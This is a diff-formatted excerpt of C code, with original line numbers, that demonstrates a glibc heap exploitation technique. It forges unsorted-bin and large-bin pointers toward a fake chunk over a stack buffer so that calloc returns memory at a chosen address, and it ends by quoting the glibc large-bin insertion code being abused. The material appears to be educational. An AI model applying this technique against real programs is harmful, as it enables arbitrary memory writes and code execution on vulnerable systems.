@@ -1,0 +1,49 @@
+34  char target[0x60]; 
+
+73  unsorted_bin = malloc ( 0x4e8 );
+76  malloc ( 0x18 ); 
+
+99  int shift_amount = get_shift_amount(unsorted_bin);
+102 size_t alloc_size = ((size_t)unsorted_bin) >> (8 * shift_amount);
+103 if(alloc_size < 0x10){
+106     exit(1);
+107 }
+
+108 alloc_size = (alloc_size & 0xFFFFFFFFE) - 0x10;
+132 if((alloc_size & 0x8) != 0 || (((alloc_size & 0x4) == 0x4) && ((alloc_size & 0x2) != 0x2))) {
+137     return 1;
+138 }
+142 if(alloc_size < 0x410) {
+148     for(int i = 0; i < 7; i++){
+149         tcaches[i] = malloc(alloc_size);
+150     }
+151     for(int i = 0; i < 7; i++){
+152         free(tcaches[i]);
+153     }
+154 }
+
+159 large_bin  =  malloc ( 0x4d8 );
+161 malloc ( 0x18 );
+164 free ( large_bin );
+165 free ( unsorted_bin );
+
+168 unsorted_bin = malloc(0x4e8);
+169 free(unsorted_bin);
+
+187 fake_chunk = target - 0x10;
+204 ((size_t *)unsorted_bin)[1] = (size_t)fake_chunk;
+207 (( size_t *) large_bin )[1] = (size_t)fake_chunk + 8;
+245 (( size_t *) large_bin )[3] = (size_t)fake_chunk - 0x18 - shift_amount;
+
+278 ptr = calloc(alloc_size, 1);
+
+
+
+
+
+bck = bin;
+fwd = bck;
+bck = bck->bk;
+victim->fd_nextsize = fwd->fd;
+victim->bk_nextsize = fwd->fd->bk_nextsize;
+fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
